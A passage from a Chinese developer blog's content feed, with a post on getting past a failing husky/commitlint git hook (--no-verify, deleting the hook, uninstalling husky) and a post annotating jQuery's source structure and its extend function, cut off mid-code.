number">.9</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">)</span>⧗   input<span class="token punctuation">:</span> <span class="token punctuation">[</span>feat<span class="token punctuation">]</span><span class="token punctuation">:</span> 修改弹窗✖   subject may not be empty <span class="token punctuation">[</span>subject<span class="token operator">-</span>empty<span class="token punctuation">]</span>✖   type may not be empty <span class="token punctuation">[</span>type<span class="token operator">-</span>empty<span class="token punctuation">]</span>✖   found <span class="token number">2</span> problems<span class="token punctuation">,</span> <span class="token number">0</span> warningsⓘ   Get help<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>conventional<span class="token operator">-</span>changelog<span class="token operator">/</span>commitlint<span class="token operator">/</span>#what<span class="token operator">-</span>is<span class="token operator">-</span>commitlinthusky <span class="token operator">></span> commit<span class="token operator">-</span>msg hook failed <span class="token punctuation">(</span>add <span class="token operator">--</span>no<span class="token operator">-</span>verify to bypass<span class="token punctuation">)</span>➜  guchejia_web_app git<span class="token punctuation">:</span><span class="token punctuation">(</span>uicheck<span class="token punctuation">)</span> ✗ git statusOn branch uicheckChanges to be committed<span class="token punctuation">:</span>  <span class="token punctuation">(</span>use <span class="token string">"git reset HEAD &lt;file>..."</span> to unstage<span class="token punctuation">)</span>        modified<span class="token punctuation">:</span>   npm<span class="token operator">-</span>shrinkwrap<span class="token punctuation">.</span>json        modified<span class="token punctuation">:</span>   src<span class="token operator">/</span>page<span class="token operator">/</span>weibaochaxun<span class="token operator">/</span>app<span class="token punctuation">.</span>tsx        modified<span class="token punctuation">:</span>   src<span class="token operator">/</span>page<span class="token operator">/</span>weibaochaxun<span class="token operator">/</span>components<span class="token operator">/</span>dialog<span class="token operator">/</span>index<span class="token punctuation">.</span>tsx        modified<span class="token punctuation">:</span>   src<span class="token operator">/</span>page<span class="token operator">/</span>weibaochaxun<span class="token operator">/</span>components<span class="token operator">/</span>dialog<span class="token operator">/</span>style<span class="token punctuation">.</span>scss        modified<span class="token punctuation">:</span>   src<span class="token operator">/</span>page<span class="token operator">/</span>weibaochaxun<span class="token operator">/</span>components<span class="token operator">/</span>payResultToast<span class="token operator">/</span>index<span class="token punctuation">.</span>tsx        modified<span class="token punctuation">:</span>   src<span class="token operator">/</span>page<span class="token operator">/</span>weibaochaxun<span class="token operator">/</span>components<span class="token operator">/</span>payResultToast<span class="token operator">/</span>style<span class="token punctuation">.</span>scss        modified<span class="token punctuation">:</span>   src<span class="token operator">/</span>page<span class="token operator">/</span>weibaochaxun<span class="token operator">/</span>pages<span class="token operator">/</span>tcDetail<span class="token operator">/</span>index<span class="token punctuation">.</span>tsx        modified<span class="token punctuation">:</span>   src<span class="token operator">/</span>page<span class="token operator">/</span>weibaochaxun<span class="token operator">/</span>weibaochaxun<span class="token punctuation">.</span>html➜  guchejia_web_app git<span class="token punctuation">:</span><span class="token punctuation">(</span>uicheck<span class="token punctuation">)</span> ✗ git push origin uicheck warning<span class="token punctuation">:</span> redirecting to http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token comment" spellcheck="true">/***/</span>guchejia_web_app<span class="token punctuation">.</span>git<span class="token operator">/</span>Everything up<span class="token operator">-</span>to<span class="token operator">-</span>date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ol><li>在终端输入git commit -am “**”，提交代码时</li><li>会触发pre-commit的钩子，他会在Git提交信息之前先做代码风格的检测</li><li>如果不符合相应规则，会报错</li><li>它的检测规则就是根据.git/hooks/pre-commit文件里面的相关定义</li></ol><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li><p>提交代码commit时，忽略pre-commit校验的钩子，加上参数–no-verify</p><pre class="line-numbers language-js"><code class="language-js">➜  guchejia_web_app git<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">5.1</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">)</span> ✗ git commit <span class="token operator">--</span>no<span class="token operator">-</span>verify <span class="token operator">-</span>am <span class="token string">"[feat]:修改维保查询弹窗"</span><span class="token punctuation">[</span><span class="token number">5.1</span><span class="token punctuation">.</span><span class="token number">1</span> da8c2c0<span class="token punctuation">]</span> <span class="token punctuation">[</span>feat<span class="token punctuation">]</span><span class="token punctuation">:</span>修改维保查询弹窗 <span class="token number">8</span> files changed<span class="token punctuation">,</span> <span class="token number">5657</span> <span class="token function">insertions</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5612</span> <span class="token function">deletions</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>删除.git/hooks下的的pre-commit文件，重新commit</p><pre class="line-numbers language-js"><code class="language-js">➜  guchejia_web_app git<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">5.1</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">)</span> ll <span class="token punctuation">.</span>git<span class="token operator">/</span>hooks total <span class="token number">264</span><span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> applypatch<span class="token operator">-</span>msg<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   478B <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> applypatch<span class="token operator">-</span>msg<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> commit<span class="token operator">-</span>msg<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   896B <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> commit<span class="token operator">-</span>msg<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">3</span><span class="token punctuation">.</span>2K <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> fsmonitor<span class="token operator">-</span>watchman<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> post<span class="token operator">-</span>applypatch<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> post<span class="token operator">-</span>checkout<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> post<span class="token operator">-</span>commit<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> post<span class="token operator">-</span>merge<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> post<span class="token operator">-</span>receive<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> post<span class="token operator">-</span>rewrite<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> post<span class="token operator">-</span>update<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   189B <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> post<span class="token operator">-</span>update<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>applypatch<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   424B <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> pre<span class="token operator">-</span>applypatch<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>auto<span class="token operator">-</span>gc<span class="token operator">-</span>rwxrwxrwx  <span class="token number">1</span> a96  staff    88B <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>commit<span class="token operator">-</span>rw<span class="token operator">-</span>r<span class="token operator">--</span>r<span class="token operator">--</span>  <span class="token number">1</span> a96  staff   106B <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>commit<span class="token punctuation">.</span>old<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>6K <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> pre<span class="token operator">-</span>commit<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>merge<span class="token operator">-</span>commit<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>push<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>3K <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> pre<span class="token operator">-</span>push<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>rebase<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">4</span><span class="token punctuation">.</span>8K <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> pre<span class="token operator">-</span>rebase<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> pre<span class="token operator">-</span>receive<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   544B <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> pre<span class="token operator">-</span>receive<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> prepare<span class="token operator">-</span>commit<span class="token operator">-</span>msg<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>5K <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> prepare<span class="token operator">-</span>commit<span class="token operator">-</span>msg<span class="token punctuation">.</span>sample<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> push<span class="token operator">-</span>to<span class="token operator">-</span>checkout<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> sendemail<span class="token operator">-</span>validate<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">1</span><span class="token punctuation">.</span>4K <span class="token number">10</span>  <span class="token number">9</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">13</span> update<span class="token operator">-</span>rwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x  <span class="token number">1</span> a96  staff   <span class="token number">3</span><span class="token punctuation">.</span>5K <span class="token number">10</span> <span class="token number">10</span>  <span class="token number">2019</span> update<span class="token punctuation">.</span>sample<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ol start="3"><li>卸载husky</li></ol><p>总结：以上几种方法都是在commit提交时忽略代码规则校验。建议在codeing的过程中可以经常运行一下代码校验修整命令，不要把校验都放在提交的环节</p>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JQuery源码解析</title>
      <link href="2020/11/03/JQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
      <url>2020/11/03/JQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>github 上关于 jQuery 源码的全文注解，感兴趣的可以围观一下。jQuery v1.10.2 源码注解（<a href="https://github.com/chokcoco/jQuery-）" target="_blank" rel="noopener">https://github.com/chokcoco/jQuery-）</a> 。</p><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a><strong>整体架构</strong></h2><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm6vj17rqwj30hi0yemye.jpg" alt="图片"></p><p>不同于 jQuery 代码各个模块细节实现的晦涩难懂，jQuery 整体框架的结构十分清晰，按代码行文大致分为如上图所示的模块。</p><p>初看 jQuery 源码可能很容易一头雾水，因为 9000 行的代码感觉没有尽头，所以了解作者的行文思路十分重要。</p><p>整体而言，我觉得 jQuery 采用的是总–分的结构，虽然JavaScript有着作用域的提升机制，但是 9000 多行的代码为了相互的关联性，并不代表所有的变量都要定义在最顶部。在 jQuery 中，只有全局都会用到的变量、正则表达式定义在了代码最开头，而每个模块一开始，又会定义一些只在本模块会使用到的变量、正则、方法等。所以在一开始的阅读的过程中会有很多看不懂其作用的变量，正则，方法。</p><p>所以，我觉得阅读源码很重要的一点是，摒弃面向过程的思维方式，不要刻意去追求从上至下每一句都要在一开始弄明白。很有可能一开始你在一个奇怪的方法或者变量处卡壳了，很想知道这个方法或变量的作用，然而可能它要到几千行处才被调用到。如果去追求这种逐字逐句弄清楚的方式，很有可能在碰壁几次之后阅读的积极性大受打击。 </p><p>道理说了很多，接来下进入真正的正文，对 jQurey 的一些前期准备，小的细节进行分析：</p><h2 id="闭包结构"><a href="#闭包结构" class="headerlink" title="闭包结构"></a><strong>闭包结构</strong></h2><blockquote><p><em>// 用一个函数域包起来，就是所谓的沙箱</em></p><p><em>// 在这里边 var 定义的变量，属于这个函数域内的局部变量，避免污染全局</em></p><p><em>// 把当前沙箱需要的外部变量通过函数参数引入进来</em></p><p><em>// 只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数</em></p><p>(<strong>function</strong>(window, undefined) {</p><p>  <em>// jQuery 代码</em></p><p>})(window);</p></blockquote><p>jQuery 具体的实现，都被包含在了一个立即执行函数构造的闭包里面，为了不污染全局作用域，只在后面暴露 $ 和 jQuery 这 2 个变量给外界，尽量的避开变量冲突。常用的还有另一种写法：</p><blockquote><p>(<strong>function</strong>(window) {</p><p>  <em>// JS代码</em></p><p>})(window, undefined);</p></blockquote><p>比较推崇的的第一种写法，也就是 jQuery 的写法。二者有何不同呢，当我们的代码运行在更早期的环境当中（pre-ES5，eg. Internet Explorer 8），undefined 仅是一个变量且它的值是可以被覆盖的。意味着你可以做这样的操作：</p><blockquote><p>undefined = 42</p><p>console.log(undefined) <em>// 42</em></p></blockquote><p>当使用第一种方式，可以确保你需要的 undefined 确实就是 undefined。</p><p>另外不得不提出的是，jQuery 在这里有一个针对压缩优化细节，使用第一种方式，在代码压缩的时候，window 和 undefined 都可以压缩为 1 个字母并且确保它们就是 window 和 undefined。</p><blockquote><p><em>// 压缩策略</em></p><p><em>// w -&gt; windwow , u -&gt; undefined</em></p><p>(<strong>function</strong>(w, u) {</p><p>})(window);</p></blockquote><h2 id="无-new-构造"><a href="#无-new-构造" class="headerlink" title="无 new 构造"></a><strong>无 new 构造</strong></h2><p> 嘿，回想一下使用 jQuery 的时候，实例化一个 jQuery 对象的方法：</p><blockquote><p><em>// 无 new 构造</em></p><p>$(‘#test’).text(‘Test’);</p><p><em>// 当然也可以使用 new</em></p><p><strong>var</strong> test = <strong>new</strong> $(‘#test’);</p><p>test.text(‘Test’);</p></blockquote><p>大部分人使用 jQuery 的时候都是使用第一种无 new 的构造方式，直接 $(”) 进行构造，这也是 jQuery 十分便捷的一个地方。当我们使用第一种无 new 构造方式的时候，其本质就是相当于 new jQuery()，那么在 jQuery 内部是如何实现的呢？看看：</p><blockquote><p>(function(window, undefined) {</p><p>​    var </p><p>​    // …</p><p>​    jQuery = function(selector, context) {</p><p>​        // The jQuery object is actually just the init constructor ‘enhanced’</p><p>​        // 看这里，实例化方法 jQuery() 实际上是调用了其拓展的原型方法 jQuery.fn.init</p><p>​        return new jQuery.fn.init(selector, context, rootjQuery);</p><p>​    },</p><p>​    // jQuery.prototype 即是 jQuery 的原型，挂载在上面的方法，即可让所有生成的 jQuery 对象使用</p><p>​    jQuery.fn = jQuery.prototype = {</p><p>​        // 实例化化方法，这个方法可以称作 jQuery 对象构造器</p><p>​        init: function(selector, context, rootjQuery) {</p><p>​            // … </p><p>​        }</p><p>​    }</p><p>​    // 这一句很关键，也很绕</p><p>​    // jQuery 没有使用 new 运算符将 jQuery 实例化，而是直接调用其函数</p><p>​    // 要实现这样,那么 jQuery 就要看成一个类，且返回一个正确的实例</p><p>​    // 且实例还要能正确访问 jQuery 类原型上的属性与方法</p><p>​    // jQuery 的方式是通过原型传递解决问题，把 jQuery 的原型传递给jQuery.prototype.init.prototype</p><p>​    // 所以通过这个方法生成的实例 this 所指向的仍然是 jQuery.fn，所以能正确访问 jQuery 类原型上的属性与方法</p><p>​    jQuery.fn.init.prototype = jQuery.fn;</p><p>})(window);</p></blockquote><p>大部分人初看 jQuery.fn.init.prototype = jQuery.fn 这一句都会被卡主，很是不解。但是这句真的算是 jQuery 的绝妙之处。理解这几句很重要，分点解析一下：</p><p>1）首先要明确，使用 $(‘xxx’) 这种实例化方式，其内部调用的是 return new jQuery.fn.init(selector, context, rootjQuery) 这一句话，也就是构造实例是交给了 jQuery.fn.init() 方法取完成。</p><p>2）将 jQuery.fn.init 的 prototype 属性设置为 jQuery.fn，那么使用 new jQuery.fn.init() 生成的对象的原型对象就是 jQuery.fn ，所以挂载到 jQuery.fn 上面的函数就相当于挂载到 jQuery.fn.init() 生成的 jQuery 对象上，所有使用 new jQuery.fn.init() 生成的对象也能够访问到 jQuery.fn 上的所有原型方法。</p><p>3）也就是实例化方法存在这么一个关系链  </p><ul><li>jQuery.fn.init.prototype = jQuery.fn = jQuery.prototype ;</li><li>new jQuery.fn.init() 相当于 new jQuery() ;</li><li>jQuery() 返回的是 new jQuery.fn.init()，而 var obj = new jQuery()，所以这 2 者是相当的，所以我们可以无 new 实例化 jQuery 对象。</li></ul><h2 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a><strong>方法的重载</strong></h2><p>jQuery 源码晦涩难读的另一个原因是，使用了大量的方法重载，但是用起来却很方便：</p><blockquote><p><em>// 获取 title 属性的值</em></p><p>$(‘#id’).attr(‘title’);</p><p><em>// 设置 title 属性的值</em></p><p>$(‘#id’).attr(‘title’,’jQuery’);</p><p><em>// 获取 css 某个属性的值</em></p><p>$(‘#id’).css(‘title’);</p><p><em>// 设置 css 某个属性的值</em></p><p>$(‘#id’).css(‘width’,’200px’);</p></blockquote><p>方法的重载即是一个方法实现多种功能，经常又是 get 又是 set，虽然阅读起来十分不易，但是从实用性的角度考虑，这也是为什么 jQuery 如此受欢迎的原因，大多数人使用 jQuery() 构造方法使用的最多的就是直接实例化一个 jQuery 对象，但其实在它的内部实现中，有着 9 种不同的方法重载场景：</p><blockquote><p><em>// 接受一个字符串，其中包含了用于匹配元素集合的 CSS 选择器</em></p><p>jQuery([selector,[context]])</p><p><em>// 传入单个 DOM</em></p><p>jQuery(element)</p><p><em>// 传入 DOM 数组</em></p><p>jQuery(elementArray)</p><p><em>// 传入 JS 对象</em></p><p>jQuery(<strong>object</strong>)</p><p><em>// 传入 jQuery 对象</em></p><p>jQuery(jQuery <strong>object</strong>)</p><p><em>// 传入原始 HTML 的字符串来创建 DOM 元素</em></p><p>jQuery(html,[ownerDocument])</p><p>jQuery(html,[attributes])</p><p><em>// 传入空参数</em></p><p>jQuery()</p><p><em>// 绑定一个在 DOM 文档载入完成后执行的函数</em></p><p>jQuery(callback)</p></blockquote><p>所以读源码的时候，很重要的一点是结合 jQuery API 进行阅读，去了解方法重载了多少种功能，同时我想说的是，jQuery 源码有些方法的实现特别长且繁琐，因为 jQuery 本身作为一个通用性特别强的框架，一个方法兼容了许多情况，也允许用户传入各种不同的参数，导致内部处理的逻辑十分复杂，所以当解读一个方法的时候感觉到了明显的困难，尝试着跳出卡壳的那段代码本身，站在更高的维度去思考这些复杂的逻辑是为了处理或兼容什么，是否是重载，为什么要这样写，一定会有不一样的收获。其次，也是因为这个原因，jQuery 源码存在许多兼容低版本的 HACK 或者逻辑十分晦涩繁琐的代码片段，浏览器兼容这样的大坑极其容易让一个前端工程师不能学到编程的精髓，所以不要太执着于一些边角料，即使兼容性很重要，也应该适度学习理解，适可而止。</p><h2 id="jQuery-fn-extend-与-jQuery-extend"><a href="#jQuery-fn-extend-与-jQuery-extend" class="headerlink" title="jQuery.fn.extend 与 jQuery.extend"></a><strong>jQuery.fn.extend 与 jQuery.extend</strong></h2><p>extend 方法在 jQuery 中是一个很重要的方法，jQuey 内部用它来扩展静态方法或实例方法，而且我们开发 jQuery 插件开发的时候也会用到它。但是在内部，是存在 jQuery.fn.extend 和 jQuery.extend 两个 extend 方法的，而区分这两个 extend 方法是理解 jQuery 的很关键的一部分。先看结论：</p><p>1）jQuery.extend(object) 为扩展 jQuery 类本身，为类添加新的静态方法；</p><p>2）jQuery.fn.extend(object) 给 jQuery 对象添加实例方法，也就是通过这个 extend 添加的新方法，实例化的 jQuery 对象都能使用，因为它是挂载在 jQuery.fn 上的方法（上文有提到，jQuery.fn = jQuery.prototype ）。 </p><p>它们的官方解释是：</p><p>1）jQuery.extend(): 把两个或者更多的对象合并到第一个当中，</p><p>2）jQuery.fn.extend()：把对象挂载到 jQuery 的 prototype 属性，来扩展一个新的 jQuery 实例方法。</p><p>也就是说，使用 jQuery.extend() 拓展的静态方法，我们可以直接使用 $.xxx 进行调用（xxx是拓展的方法名），</p><p>而使用 jQuery.fn.extend() 拓展的实例方法，需要使用 $().xxx 调用。</p><p>源码解析较长，点击下面可以展开，也可以去这里阅读：</p><blockquote><p><em>// 扩展合并函数</em></p><p><em>// 合并两个或更多对象的属性到第一个对象中，jQuery 后续的大部分功能都通过该函数扩展</em></p><p><em>// 虽然实现方式一样，但是要注意区分用法的不一样，那么为什么两个方法指向同一个函数实现，但是却实现不同的功能呢,</em></p><p><em>// 阅读源码就能发现这归功于 this 的强大力量</em></p><p><em>// 如果传入两个或多个对象，所有对象的属性会被添加到第一个对象 target</em></p><p><em>// 如果只传入一个对象，则将对象的属性添加到 jQuery 对象中，也就是添加静态方法</em></p><p><em>// 用这种方式，我们可以为 jQuery 命名空间增加新的方法，可以用于编写 jQuery 插件</em></p><p><em>// 如果不想改变传入的对象，可以传入一个空对象：$.extend({}, object1, object2);</em></p><p><em>// 默认合并操作是不迭代的，即便 target 的某个属性是对象或属性，也会被完全覆盖而不是合并</em></p><p><em>// 如果第一个参数是 true，则是深拷贝</em></p><p><em>// 从 object 原型继承的属性会被拷贝，值为 undefined 的属性不会被拷贝</em></p><p><em>// 因为性能原因，JavaScript 自带类型的属性不会合并</em></p><p>jQuery.extend = jQuery.fn.extend = <strong>function</strong>() {</p><p>  <strong>var</strong> src, copyIsArray, copy, name, options, <strong>clone</strong>,</p><p>​    target = arguments[0] || {},</p><p>​    i = 1,</p><p>​    length = arguments.length,</p><p>​    deep = <strong>false</strong>;</p><p>  <em>// Handle a deep copy situation</em></p><p>  <em>// target 是传入的第一个参数</em></p><p>  <em>// 如果第一个参数是布尔类型，则表示是否要深递归，</em></p><p>  <strong>if</strong> (typeof target === “boolean”) {</p><p>​    deep = target;</p><p>​    target = arguments[1] || {};</p><p>​    <em>// skip the boolean and the target</em></p><p>​    <em>// 如果传了类型为 boolean 的第一个参数，i 则从 2 开始</em></p><p>​    i = 2;</p><p>  }</p><p>  <em>// Handle case when target is a string or something (possible in deep copy)</em></p><p>  <em>// 如果传入的第一个参数是 字符串或者其他</em></p><p>  <strong>if</strong> (typeof target !== “object” &amp;&amp; !jQuery.isFunction(target)) {</p><p>​    target = {};</p><p>  }</p><p>  <em>// extend jQuery itself if only one argument is passed</em></p><p>  <em>// 如果参数的长度为 1 ，表示是 jQuery 静态方法</em></p><p>  <strong>if</strong> (length === i) {</p><p>​    target = <strong>this</strong>;</p><p>​    –i;</p><p>  }</p><p>  <em>// 可以传入多个复制源</em></p><p>  <em>// i 是从 1或2 开始的</em></p><p>  <strong>for</strong> (; i &lt; length; i++) {</p><p>​    <em>// Only deal with non-null/undefined values</em></p><p>​    <em>// 将每个源的属性全部复制到 target 上</em></p><p>​    <strong>if</strong> ((options = arguments[i]) != <strong>null</strong>) {</p><p>​      <em>// Extend the base object</em></p><p>​      <strong>for</strong> (name <strong>in</strong> options) {</p><p>​        <em>// src 是源（即本身）的值</em></p><p>​        <em>// copy 是即将要复制过去的值</em></p><p>​        src = target[name];</p><p>​        copy = options[name];</p><p>​        <em>// Prevent never-ending loop</em></p><p>​        <em>// 防止有环，例如 extend(true, target, {‘target’:target});</em></p><p>​        <strong>if</strong> (target === copy) {</p><p>​          <strong>continue</strong>;</p><p>​        }</p><p>​        <em>// Recurse if we’re merging plain objects or arrays</em></p><p>​        <em>// 这里是递归调用，最终都会到下面的 else if 分支</em></p><p>​        <em>// jQuery.isPlainObject 用于测试是否为纯粹的对象</em></p><p>​        <em>// 纯粹的对象指的是 通过 “{}” 或者 “new Object” 创建的</em></p><p>​        <em>// 如果是深复制</em></p><p>​        <strong>if</strong> (deep &amp;&amp; copy &amp;&amp; (jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy)))) {</p><p>​          <em>// 数组</em></p><p>​          <strong>if</strong> (copyIsArray) {</p><p>​            